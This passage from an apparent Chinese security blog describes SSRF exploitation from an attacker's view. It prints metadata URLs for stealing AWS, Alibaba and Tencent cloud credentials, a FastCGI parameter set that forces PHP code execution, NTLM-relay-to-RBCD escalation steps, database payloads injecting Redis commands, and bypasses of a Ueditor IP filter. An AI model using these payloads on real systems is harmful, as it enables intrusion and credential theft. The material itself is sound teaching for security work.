有密码情况的利用</h3><p>linux看passwd可以初步判断有无redis服务。然后就是读redis配置文件或者代码的配置文件获取密码了</p><p>有密码主要涉及到非交互模式下auth的逻辑。</p><p><a href="https://redis.io/topics/pipelining%E3%80%82%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BB%99%E5%87%BA%E4%BA%86%E6%96%B9%E6%A1%88%EF%BC%8Credis%E6%94%AF%E6%8C%81%E4%B8%80%E6%AC%A1%E5%8F%91%E5%87%BA%E5%A4%9A%E6%AC%A1request%EF%BC%8C%E5%9B%A0%E6%AD%A4%E9%9D%9E%E4%BA%A4%E4%BA%92%E6%A8%A1%E5%BC%8F%E4%B8%8B%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E6%AF%8F%E6%AC%A1%E8%AF%B7%E6%B1%82%E9%83%BD%E9%A2%9D%E5%A4%96%E5%B8%A6%E4%B8%80%E4%B8%8Bauth%E3%80%82">https://redis.io/topics/pipelining。官方文档给出了方案，redis支持一次发出多次request，因此非交互模式下，我们可以每次请求都额外带一下auth。</a></p><p>上面我们简单带过一次dict协议，dict协议无法传递换行回车来带上其他命令，因此dict协议只能执行一次命令，在非交互的情况下必须利用pipeline的方式一次发送多个请求。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923144213398.png" alt="image-20240923144213398" /></p><p>http的情况是可以的：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923144621754.png" alt="image-20240923144621754" /></p><p>因此只要可以构造两行或者多行数据，就可以用来攻击redis。</p><p>gopher就更不用提了。</p><h2 id="axis"><a class="markdownIt-Anchor" href="#axis"></a> Axis</h2><p>Axis的adminService存在漏洞，但是这个接口限制了仅允许localhost访问，因此通常配合ssrf打组合拳</p><p>想了解的可以看这篇文章：<a href="https://paper.seebug.org/1489/">https://paper.seebug.org/1489/</a></p><p><strong>不做详细漏洞分析，说一些经验和打法。</strong></p><p>apache Axis是一种web services引擎。</p><ul><li>黑盒的时候可以看一下axis/service/、axis、service、services、axis2等目录是否存在相关web service，具体的axis版本也能看到</li><li>白盒的时候看路由就可以了，关键字即可。</li></ul><p>Axis是同时支持get和post请求的，相比较于post请求的参数和格式要求，使用GET的情况会更多，实战中注意系统中可能自带的特殊字符filter即可。</p><h3 id="实战中的axis案例"><a class="markdownIt-Anchor" href="#实战中的axis案例"></a> 实战中的Axis案例</h3><p>利用其他ssrf（例xxe等），配合axis打组合拳。比如利用很多的宏景hcm。</p><p>自己之前打某金融项目也遇见过一个有意思的情况：<strong>配置了nginx，导致adminSerive可以直接调用，不需要前置的ssrf</strong></p><h2 id="云服务器"><a class="markdownIt-Anchor" href="#云服务器"></a> 云服务器</h2><p><strong>需要回显，不同服务器厂商的接口和请求方式可能不同</strong></p><p>访问元数据服务，可能获取实例信息和数据</p><p>&lt;1&gt;亚马逊云:</p><p>step1. 获取通过ssrf漏洞，拿到iam角色名</p><p><a href="http://169.254.169.254/latest/meta-data/iam/security-credentials">http://169.254.169.254/latest/meta-data/iam/security-credentials</a></p><p>step2. 通过ssrf漏洞，拿到该角色的临时凭据</p><p><a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/">http://169.254.169.254/latest/meta-data/iam/security-credentials/</a>&lt;role_name&gt;</p><p>&lt;2&gt;阿里云</p><p>Step1. 获取RAM角色名</p><p><a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/">http://100.100.100.200/latest/meta-data/ram/security-credentials/</a></p><p>Step2. 获取该角色的凭据</p><p><a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/">http://100.100.100.200/latest/meta-data/ram/security-credentials/</a><a href="http://100.100.100.200/latest/meta-data/ram/security-credentials/"></a></p><p>阿里云提供这个几个api仅限于get请求</p><p>&lt;3&gt; 腾讯云</p><p>获取CAM角色的凭据:</p><p><a href="http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/$%7Brole-name%7D">http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/${role-name}</a></p><p>腾讯云提供的api，get请求和post请求都接收</p><p><strong>实战看运气，看具体的角色分配</strong></p><h2 id="内网常见业务"><a class="markdownIt-Anchor" href="#内网常见业务"></a> 内网常见业务</h2><h3 id="docker-api"><a class="markdownIt-Anchor" href="#docker-api"></a> docker Api</h3><p>api要求post调用，因此对于ssrf的入口点限制较大。</p><p>因为要获取容器id等信息，因此必须要有回显。</p><p>实战中遇见的很少。</p><h3 id="gitlab"><a class="markdownIt-Anchor" href="#gitlab"></a> gitlab</h3><p>结合回显ssrf，通过gitlab公开的项目下载源码等。</p><p>gitlab/explore会存在未授权访问。</p><p>实战可以下载打包好的代码或配置文件。</p><h3 id="php-fpm"><a class="markdownIt-Anchor" href="#php-fpm"></a> PHP-FPM</h3><pre class="line-numbers language-none"><code class="language-none">curl7.71.1增加了限制：https:&#x2F;&#x2F;github.com&#x2F;curl&#x2F;curl&#x2F;commit&#x2F;31e53584db5879894809fbde5445aac7553ac3e2导致无法使用gopher构造合适的协议数据，攻击失败<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>PHP-FPM接收CGI协议内容并解析，然后执行对应的PHP文件。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240923160619294.png" alt="image-20240923160619294" /></p><p>因此我们可以分析一下CGI协议，看看是否可以伪造CGI协议，让PHP-FPM可以解析我们想解析的恶意文件。</p><p>抓包看到cgi传递的是一系列键值对信息。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924111527609.png" alt="image-20240924111527609" /></p><p>这里直接拿网上现成的分析举例了：</p><p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么传递的键值对将是如下：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    'GATEWAY_INTERFACE'<span class="token operator">:</span> 'FastCGI/<span class="token number">1.0</span>'<span class="token punctuation">,</span>    'REQUEST_METHOD'<span class="token operator">:</span> 'GET'<span class="token punctuation">,</span>    'SCRIPT_FILENAME'<span class="token operator">:</span> '/var/www/html/index.php'<span class="token punctuation">,</span>    'SCRIPT_NAME'<span class="token operator">:</span> '/index.php'<span class="token punctuation">,</span>    'QUERY_STRING'<span class="token operator">:</span> '?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>    'REQUEST_URI'<span class="token operator">:</span> '/index.php?a=<span class="token number">1</span>&amp;b=<span class="token number">2</span>'<span class="token punctuation">,</span>    'DOCUMENT_ROOT'<span class="token operator">:</span> '/var/www/html'<span class="token punctuation">,</span>    'SERVER_SOFTWARE'<span class="token operator">:</span> 'php/fcgiclient'<span class="token punctuation">,</span>    'REMOTE_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>    'REMOTE_PORT'<span class="token operator">:</span> '<span class="token number">12345</span>'<span class="token punctuation">,</span>    'SERVER_ADDR'<span class="token operator">:</span> '<span class="token number">127.0</span>.<span class="token number">0.1</span>'<span class="token punctuation">,</span>    'SERVER_PORT'<span class="token operator">:</span> '<span class="token number">80</span>'<span class="token punctuation">,</span>    'SERVER_NAME'<span class="token operator">:</span> <span class="token string">"localhost"</span><span class="token punctuation">,</span>    'SERVER_PROTOCOL'<span class="token operator">:</span> 'HTTP/<span class="token number">1.1</span>'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终会执行<code>SCRIPT_FILENAME</code>变量指向的文件。</p><p>而fpm在高版本默认限制了文件的后缀。</p><p>其实著名的nginx解析漏洞就是fastcgi的pathinfo fixBug的问题，导致可以解析任意文件。而增加了这个修复之后，解析漏洞就不再存在了，因为限制了只允许解析php文件（这里p🐂的博客也说过，可以去看一下）</p><pre class="line-numbers language-none"><code class="language-none">; Limits the extensions of the main script FPM will allow to parse. This can; prevent configuration mistakes on the web server side. You should only limit; FPM to .php extensions to prevent malicious users to use other extensions to; exectute php code.; Note: set an empty value to allow all extensions.; Default Value: .php;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到现在我们发现可以伪造协议执行系统上的任意php文件，但这样还是很鸡肋，cgi协议里面有没有其他可以被利用的配置呢？</p><p>这就要说回PHP了，PHP的环境变量有两项比较有意思的配置：<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件</p><p><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p><p>如果设置<code>auto_prepend_file</code>为<code>php://input</code>，那么就能直接执行post的代码了。（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p><p>接下来就是利用cgi协议，设置运行的环境变量，利用<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code></p><pre class="line-numbers language-none"><code class="language-none">&#123;    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;: &#39;80&#39;,    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>整个利用线路也就打通了，分析上面的流程也能发现，利用是要有前提的：</p><ul><li>需要知道服务器上一个已知的php文件路径，可以通过报错，或者linux安装php时自带的php文件。</li></ul><p><strong>因为cgi涉及到严格的格式问题，因此只能利用在可构造完整二进制数据的ssrf点，比如gopher。</strong></p><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><p>其实上面举的常见例子都是内网中常见的未授权访问漏洞，其他未授权漏洞当然也在ssrf的利用中，比如hadoop等。</p><p>或者其他可以直接构造poc的web系统，比如st2、Confluence等，只要入口点可以构造出对应的数据即可。思路要打开。</p><h2 id="java-ssrf的ntlm-relay"><a class="markdownIt-Anchor" href="#java-ssrf的ntlm-relay"></a> java SSRF的NTLM relay</h2><p>java的<code>sun.net.www.protocol.http.HttpURLConnection</code>发送HTTP请求时返回为401的HTTP返回头时，会判断该页面要求使用哪种认证方式，若攻击者回复要求采用NTLM认证则会自动使用当前用户凭据进行认证。</p><p><strong>在 JDK 8u351 中已经修复 (针对 TrustedSites 增加了 AuthMode 字段, 默认为 <code>DISABLED</code>)，不再会默认发起认证</strong></p><p>这个在A-Team的文章中有实例，顺便分析一下XXE  to RCE的过程。</p><p>写文章的时候发现A-Team大概确实是死掉了：</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924152017492.png" alt="image-20240924152017492" /></p><p>这是一篇“不一样”的真实渗透测试案例分析文章，搜索此关键字即可。</p><ol><li>入口点</li></ol><p>​文中的漏洞点是webdav的xxe导致的ssrf（<strong>服务是system权限，出网为机器用户权限，iis和service出网也为机器用户权限</strong>）</p><ol start="2"><li><p>无法relay回自身</p><p>relay是机器用户发起，因此无法relay回自身调高权限rpc接口。</p></li><li><p>relay到ldap</p></li></ol><p>​因为是机器用户，有权限修改自身的Rbcd属性，这样修改自己的委派属性为恶意的机器用户（这里机器用户和服务用户均可，因为一般允许域用户建立10个机器用户，所以往上文章都是新建机器用户，实战中也可以选择已经拿到的机器用户和服务用户）。</p><ol start="4"><li>利用rbcd特性申请 高权限票据</li></ol><p>​rbcd可以申请任意用户到被委派的服务的票据，因此可以申请administrator用户到目标cifs服务的权限，这样就拿到了目标机器的最高权限。</p><h1 id="0x02-代码案例"><a class="markdownIt-Anchor" href="#0x02-代码案例"></a> 0x02 代码案例</h1><h2 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h2><p><strong>file_get_contents</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>无回显（需要代码中写回显）</li><li>支持协议：http（GET）、file、ftp</li></ul><p><strong>fsockopen</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php$host&#x3D;$_GET[&#39;url&#39;];$fp &#x3D; fsockopen($host, 80, $errno, $errstr, 30);if (!$fp) &#123;    echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;&#125; else &#123;    $out &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\n&quot;;    $out .&#x3D; &quot;Host: $host\r\n&quot;;    $out .&#x3D; &quot;Connection: Close\r\n\r\n&quot;;    fwrite($fp, $out);    while (!feof($fp)) &#123;        echo fgets($fp, 128);    &#125;    fclose($fp);&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>无回显（需要代码中写回显）</p></li><li><p>自定义tcp数据流，可发送任意数据。（其实weblogic的ssrf存在crlf也是类似的原因，自己封装了socket数据）</p></li></ul><p><strong>curl_exec()</strong></p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php $url&#x3D;$_POST[&#39;url&#39;]; $ch&#x3D;curl_init($url);  &#x2F;&#x2F;创造一个curl资源curl_setopt($ch, CURLOPT_HEADER, 0); &#x2F;&#x2F;设置url和相应的选项curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result&#x3D;curl_exec($ch); &#x2F;&#x2F; 抓取url并将其传递给浏览器curl_close($ch); &#x2F;&#x2F;关闭curl资源echo ($result); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>无回显（需要代码中写回显）</p></li><li><p>支持协议：dict、gopher、http、file、ftp</p></li></ul><h2 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h2><p>java的协议支持就比较少了，以1.8举例：http，https，file，ftp，mailto，jar，netdoc。</p><p>对比php有灵活的gopher，java能做的事情就很少了。</p><p><strong>HttpURLConnection</strong></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.net.HttpURLConnection;import java.net.URL;public class SSRFExample &#123;    public void makeRequest(String userInput) throws Exception &#123;        URL url &#x3D; new URL(userInput);        HttpURLConnection connection &#x3D; (HttpURLConnection) url.openConnection();        connection.setRequestMethod(&quot;GET&quot;);        int responseCode &#x3D; connection.getResponseCode();        &#x2F;&#x2F; 处理响应    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>URLConnection</strong></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.net.URL;import java.net.URLConnection;import java.io.InputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class SSRFExample &#123;    public void makeRequest(String userInput) throws Exception &#123;        URL url &#x3D; new URL(userInput);        URLConnection connection &#x3D; url.openConnection();        try (InputStream inputStream &#x3D; connection.getInputStream();             BufferedReader reader &#x3D; new BufferedReader(new InputStreamReader(inputStream))) &#123;            String line;            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;                &#x2F;&#x2F; 处理每一行                System.out.println(line);            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Socket</strong></p><pre class="line-numbers language-JAVA" data-language="JAVA"><code class="language-JAVA">import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class SSRFExample &#123;    public void connectToServer(String userInput) throws Exception &#123;        String[] parts &#x3D; userInput.split(&quot;:&quot;);        String host &#x3D; parts[0]; &#x2F;&#x2F; 主机        int port &#x3D; Integer.parseInt(parts[1]); &#x2F;&#x2F; 端口                try (Socket socket &#x3D; new Socket(host, port);             OutputStream outputStream &#x3D; socket.getOutputStream();             InputStream inputStream &#x3D; socket.getInputStream()) &#123;                         &#x2F;&#x2F; 发送请求（根据协议）            String request &#x3D; &quot;GET &#x2F; HTTP&#x2F;1.1\r\nHost: &quot; + host + &quot;\r\n\r\n&quot;;            outputStream.write(request.getBytes());            outputStream.flush();                        &#x2F;&#x2F; 处理响应            byte[] buffer &#x3D; new byte[1024];            int bytesRead;            while ((bytesRead &#x3D; inputStream.read(buffer)) !&#x3D; -1) &#123;                System.out.write(buffer, 0, bytesRead);            &#125;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="dotnet"><a class="markdownIt-Anchor" href="#dotnet"></a> Dotnet</h2><p>.NET也是类似，支持的协议比较少，File、Http</p><p><strong>HttpWebRequest</strong></p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;using System.IO;using System.Net;public class SSRFExample&#123;    public void MakeRequest(string userInput)    &#123;        HttpWebRequest request &#x3D; (HttpWebRequest)WebRequest.Create(userInput);        request.Method &#x3D; &quot;GET&quot;;        using (HttpWebResponse response &#x3D; (HttpWebResponse)request.GetResponse())        using (StreamReader reader &#x3D; new StreamReader(response.GetResponseStream()))        &#123;            string responseText &#x3D; reader.ReadToEnd();            &#x2F;&#x2F; 处理响应            Console.WriteLine(responseText);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>HttpClient</strong></p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;using System.Net.Http;using System.Threading.Tasks;public class SSRFExample&#123;    private static readonly HttpClient client &#x3D; new HttpClient();    public async Task MakeRequest(string userInput)    &#123;        HttpResponseMessage response &#x3D; await client.GetAsync(userInput);        response.EnsureSuccessStatusCode();        string responseBody &#x3D; await response.Content.ReadAsStringAsync();        &#x2F;&#x2F; 处理响应        Console.WriteLine(responseBody);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>WebClient</strong></p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;using System.Net;public class SSRFExample&#123;    public void MakeRequest(string userInput)    &#123;        using (WebClient client &#x3D; new WebClient())        &#123;            string response &#x3D; client.DownloadString(userInput);            &#x2F;&#x2F; 处理响应            Console.WriteLine(response);        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>TcpClient</strong></p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">using System;using System.Net.Sockets;using System.Text;public class SSRFExample&#123;    public void ConnectToServer(string userInput)    &#123;        string[] parts &#x3D; userInput.Split(&#39;:&#39;);        string host &#x3D; parts[0];        int port &#x3D; int.Parse(parts[1]);        using (TcpClient client &#x3D; new TcpClient(host, port))        using (NetworkStream stream &#x3D; client.GetStream())        &#123;            byte[] request &#x3D; Encoding.ASCII.GetBytes(&quot;GET &#x2F; HTTP&#x2F;1.1\r\nHost: &quot; + host + &quot;\r\n\r\n&quot;);            stream.Write(request, 0, request.Length);                        &#x2F;&#x2F; 处理响应            byte[] buffer &#x3D; new byte[1024];            int bytesRead &#x3D; stream.Read(buffer, 0, buffer.Length);            Console.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead));        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-漏洞总结"><a class="markdownIt-Anchor" href="#0x03-漏洞总结"></a> 0x03 漏洞总结</h1><h2 id="实战中常见存在漏洞的组件"><a class="markdownIt-Anchor" href="#实战中常见存在漏洞的组件"></a> 实战中常见存在漏洞的组件</h2><ul><li><p>ueditor：可回显的ssrf</p></li><li><p>XXE： system的http的ssrf</p></li><li><p>grafana：后台回显ssrf</p></li><li><p>weblogic：存在crlf注入的ssrf，可以打redis</p></li></ul><h3 id="数据库"><a class="markdownIt-Anchor" href="#数据库"></a> 数据库</h3><p>部分数据库也可以发送请求，可以用在数据库未授权或者SQL注入的场景中</p><p><strong>MongoDB</strong></p><p>db.copyDatabase(’\r\nconfig get dir\r\nquit\r\n’,‘test’,‘127.0.0.1:6379’)</p><p><strong>Oracle</strong></p><p>内置的UTL_HTTP、UTL_TCP、UTL_SMTP等方法，这些也同时被用在DNS外带注入数据的场景</p><p><strong>PostgreSQL</strong></p><pre class="line-numbers language-none"><code class="language-none">SELECT dblink_send_query(‘host&#x3D;127.0.0.1 dbname&#x3D;quit user&#x3D;\&#39;\r\nconﬁg get dir\r\n\quit\r\n’ password&#x3D;1 port&#x3D;6379 sslmode&#x3D;disable’,&#39;select version();’ );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Mysql</strong><br />load_file</p><h2 id="利用技巧"><a class="markdownIt-Anchor" href="#利用技巧"></a> 利用技巧</h2><p><strong>一、利用crlf</strong></p><p>上面已经分析过了，存在crlf的ssrf可以被用于打有密码的redis</p><p><strong>二、利用锚点</strong></p><p>业务中存在ssrf的代码通常都是 ：String url = ip + ‘/aaaaa’;</p><p>只有ip可控，这时我们可以利用锚点的特性，让后面的东西和参数不发送到服务端。当然也可以采取参数的方式，但个人更喜欢锚点的方式，有时候拼接的uri不知道都可能有什么东西。</p><p>127.0.0.1/#/aaaaa</p><p><strong>三、实战中的ssrf区分</strong></p><p>其实实战中的ssrf可以按照两种情况去分。</p><ul><li>1是是否存在回显，回显可以根据结果获取信息，没有回显只能布尔或者延时判断结果了。</li><li>2是是否可以构造完整的二进制数据，比如gopher就可以构造完整的数据，可以被用于在严格的协议伪造中，比如上面提到的cgi，如果不能构造，只有一个发起GET请求的ssrf点，就只能用于支持GET的漏洞利用点了。</li></ul><p><strong>四、CTF中的极限环境配合FTP模式的</strong></p><p>这个实战一次没见到过，但是之前刷到过，这次总结顺便放在这里了。</p><p><a href="https://www.anquanke.com/post/id/254387#h3-2">https://www.anquanke.com/post/id/254387#h3-2</a></p><h1 id="0x04-漏洞常见利用实例"><a class="markdownIt-Anchor" href="#0x04-漏洞常见利用实例"></a> 0x04 漏洞常见利用实例</h1><h2 id="weblogic"><a class="markdownIt-Anchor" href="#weblogic"></a> weblogic</h2><p>weblogic的ssrf是存在crlf漏洞的，具体原因看这篇：</p><p><a href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p><p>总之就是直接调用了socket发送数据</p><p>不过这洞本质还是构造了一个Post的http数据包，因此不能完整的构造其他的协议数据。</p><p>实战中就打过redis，其他的利用目前没想到，因为这个洞的post的data也是不可控的，内置了soap数据。</p><p>这个洞两三年前还是遇见过不少，现在遇见的很少了，客户都不用weblogic了。。。</p><p><code>http://localhost:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://test.com/hello&amp;rdoSearch=name&amp;btnSubmit=Search</code></p><p>发送的数据包如下：（<strong>因此利用上面分析的redis特性结合crlf，可以自定义一行header，这样就完成了攻击</strong>）</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;hello HTTP&#x2F;1.1 Content-Type: text&#x2F;xml; charset&#x3D;UTF-8 User-Agent: JavaHost: test.comConnection: Keep-Alive &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt; &lt;env:Envelopexmlns:soapenc&#x3D;“http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;encoding&#x2F;&quot;xmlns:xsd&#x3D;“http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema&quot;xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;&gt; &lt;env:Header&gt;&lt;&#x2F;env:Header&gt;&lt;env:Body&gt;     &lt;ﬁnd_business generic&#x3D;&quot;2.0&quot; xmlns&#x3D;&quot;urn:uddi-org:api_v2&quot;&gt;             &lt;name&gt;%&lt;&#x2F;name&gt;&lt;&#x2F;ﬁnd_business&gt; &lt;&#x2F;env:Body&gt;&lt;&#x2F;env:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ueditor"><a class="markdownIt-Anchor" href="#ueditor"></a> Ueditor</h2><p>这是一个GET型的可回显ssrf。</p><p>Ueditor可真是个好东西，.net版本有个文件写入，jsp和php版本有ssrf。</p><p>在某些版本Ueditor进行了内网ip的patch，正则匹配，无法请求内网资源。</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240924171735874.png" alt="image-20240924171735874" /></p><p>使用dns重绑定岂可绕过，或者利用domain@ip的格式绕过。</p><h1 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h1><p><a href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p><p><a href="https://paper.seebug.org/1489/">https://paper.seebug.org/1489/</a></p><p><a href="https://www.anquanke.com/post/id/255222#h2-0">https://www.anquanke.com/post/id/255222#h2-0</a></p><p><a href="https://www.freebuf.com/articles/web/179910.html">https://www.freebuf.com/articles/web/179910.html</a></p><p><a href="https://www.freebuf.com/articles/web/292437.html">https://www.freebuf.com/articles/web/292437.html</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><a href="https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/">https://xlab.tencent.com/cn/2019/03/18/ghidra-from-xxe-to-rce/</a></p><p><a href="https://www.anquanke.com/post/id/254387#h3-2">https://www.anquanke.com/post/id/254387#h3-2</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/179">https://security.tencent.com/index.php/blog/msg/179</a></p><p><a href="https://exp10it.io/2023/08/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-rbcd-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">https://exp10it.io/2023/08/基于资源的约束委派-rbcd-利用总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;序&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#序&quot;&gt;&lt;/a&gt; 序&lt;/h1&gt;
&lt;p&gt;平时做渗透的时候遇见ssrf的次数其实不少，但是都是点到为止。打攻防的时候，也用了ssrf打了不少组合拳。&lt;/p&gt;
&lt;p&gt;简单从攻防的角度，结合之前自</summary>
      
    
    
    
    
    <category term="SSRF" scheme="https://cyxsec.github.io/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入过滤字符渗透指北</title>
